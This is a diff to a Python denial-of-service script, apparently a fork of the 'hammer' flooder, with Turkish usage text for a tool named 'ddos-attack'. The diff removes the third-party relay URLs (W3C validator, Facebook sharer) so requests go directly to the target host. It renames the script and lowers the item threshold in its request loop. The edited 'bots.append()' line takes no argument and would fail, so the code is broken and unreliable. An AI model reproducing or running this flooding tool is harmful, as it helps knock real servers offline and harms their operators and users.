@@ -22,8 +22,7 @@ def user_agent():
 def my_bots():
 	global bots
 	bots=[]
-	bots.append("http://validator.w3.org/check?uri=")
-	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append()
 	return(bots)
 
 
@@ -66,7 +65,7 @@ def dos():
 def dos2():
 	while True:
 		item=w.get()
-		bot_hammering(random.choice(bots)+"http://"+host)
+		bot_hammering("http://"+host)
 		w.task_done()
 
 
@@ -75,7 +74,7 @@ def usage():
 	GitHub: https://github.com/SuperiorAsh8488/ddos-attack.git
 	Geçerli tüm yasalara uymak son kullanıcının sorumluluğundadır.
 	IP'niz görünüyor!. \n
-	kullanım : python3 hammer-beta.py [-s] [-p] [-t]
+	kullanım : python3 ddos-attack.py [-s] [-p] [-t]
 	-h : yardım
 	-s : server ip
 	-p : port varsayılan 80
@@ -150,7 +149,7 @@ if __name__ == '__main__':
 		#tasking
 		item = 0
 		while True:
-			if (item>1800): # for no memory crash
+			if (item>10): # for no memory crash
 				item=0
 				time.sleep(.1)
 			item = item + 1
